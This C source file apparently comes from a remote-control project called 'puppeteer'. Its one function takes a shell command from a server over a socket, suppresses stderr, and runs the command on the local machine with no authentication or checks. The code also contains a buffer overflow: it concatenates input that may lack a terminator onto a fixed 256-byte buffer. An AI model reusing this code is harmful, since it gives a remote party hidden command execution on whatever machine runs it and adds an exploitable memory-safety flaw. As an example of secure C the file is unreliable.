// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Runs shell command line without grabbing stdout/sterr
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/run_shell_command.h"

#include <stdlib.h>
#include <string.h>

#include "../include/commands.h"
#include "../include/sockets.h"


/*
 * Receive shell command from the server and runs it locally without grab stdo/e
 *
 * Paramaters:
 *      int16_t socket_fd:  the socket file descriptor
 */
void
run_shell_command(int16_t socket_fd) {
    char    command_buffer[256];
    char    stderr_redirect[13] = " 2>/dev/null";
    char    *command = calloc(sizeof command_buffer, sizeof(char));

    memset(command_buffer, 0, sizeof command_buffer);
    recv(socket_fd, command, sizeof command_buffer, 0);
    strcat(command_buffer, command);
    strcat(command_buffer, stderr_redirect);
    execute_cmd(command_buffer);
    free(command);
}
